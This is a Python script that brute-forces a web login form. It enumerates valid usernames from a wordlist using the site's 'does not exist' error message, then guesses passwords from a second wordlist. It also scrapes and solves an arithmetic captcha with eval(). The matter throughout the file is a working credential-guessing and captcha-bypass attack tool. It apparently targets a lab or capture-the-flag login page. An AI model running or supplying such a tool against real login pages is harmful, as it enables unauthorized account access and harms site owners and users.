#!/bin/python3 
import requests
from termcolor import colored
import time

# Get the URL from user input
url = input("Enter the login URL: ")

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': url
}

usernames = "usernames.txt"
passwords = "passwords.txt"

def brute_force_usernames():
    with open(usernames, "r") as file:
        for username in file:
            username = username.strip("\n")
            data = {
                'username': username,
                'password': 'admin'
            }
            response = requests.post(url, headers=headers, data=data)
            captcha_label = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            captcha_content = response.text
            if captcha_label in captcha_content:
                start = captcha_content.find(captcha_label) + len(captcha_label)
                end = captcha_content.find('=', start)
                captcha = captcha_content[start:end].strip()
                captcha_answer = f'{captcha} = {eval(captcha)}'
                captcha_answer = captcha_answer.split()[-1]
                data['captcha'] = captcha_answer
            send_data_url = requests.post(url, headers=headers, data=data)
            if f"does not exist" in str(send_data_url.content):
                print("[*] Attempting username: %s" % username)
            else:
                print(colored("[*] Username found: %s " % username, "green"))
                print("--------------------------------")
                time.sleep(1)
                return username

def brute_force_passwords(username):
    with open(passwords, "r") as file:
        for password in file:
            password = password.strip("\n")
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, headers=headers, data=data)
            captcha_label = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            captcha_content = response.text
            if captcha_label in captcha_content:
                start = captcha_content.find(captcha_label) + len(captcha_label)
                end = captcha_content.find('=', start)
                captcha = captcha_content[start:end].strip()
                captcha_answer = f'{captcha} = {eval(captcha)}'
                captcha_answer = captcha_answer.split()[-1]
                # Make the POST request with the username and captcha
                data['captcha'] = captcha_answer
                send_data_url = requests.post(url, headers=headers, data=data)
                if f"Invalid password for user" in str(send_data_url.content):
                    print("[*] Attempting password: %s" % password)
                else:
                    print("[*] password found: %s " % password)
                    print("--------------------------------")
                    print(colored(f"The username is : {username}\nThe password is : {password}","green"))
                    return password

valid_username = brute_force_usernames()
if valid_username:
    brute_force_passwords(valid_username)
